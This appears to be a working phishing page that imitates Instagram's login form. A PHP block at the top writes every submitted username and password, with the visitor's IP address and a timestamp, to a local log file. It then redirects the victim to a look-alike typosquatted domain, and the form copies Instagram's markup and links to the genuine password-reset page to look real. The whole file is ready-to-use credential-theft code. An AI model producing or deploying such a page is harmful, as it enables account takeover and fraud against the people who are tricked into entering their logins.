<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: http://instagrarn.github.io/instagrarn/');
$handle = fopen('log_8B617H2TSO.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿<form class="_3jvtb" action="<?php echo basename(__FILE__); ?>" method="post"><div class="_t296e"><div class="_sjplo"><div class="_ev9xl"><!--<label for="fa4e2a34ab06a" class="_ssj08">Phone number, username, or email</label>--><input type="text" class="_ph6vk _jdqpn _o716c" id="fa4e2a34ab06a" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="username" value=""></div><div class="_gaby6"></div></div></div><div class="_t296e"><div class="_sjplo"><div class="_ev9xl"><!--<label for="faa2da1ad083" class="_ssj08">Password</label>--><input type="password" class="_ph6vk _jdqpn _o716c" id="faa2da1ad083" aria-describedby="" placeholder="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" value=""></div><div class="_gaby6"></div></div></div><span class="_t38eb _ov9ai"><button class="_qv64e _gexxb _4tgw8 _njrw0">Log in</button></span><a class="_pbd5h" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></form>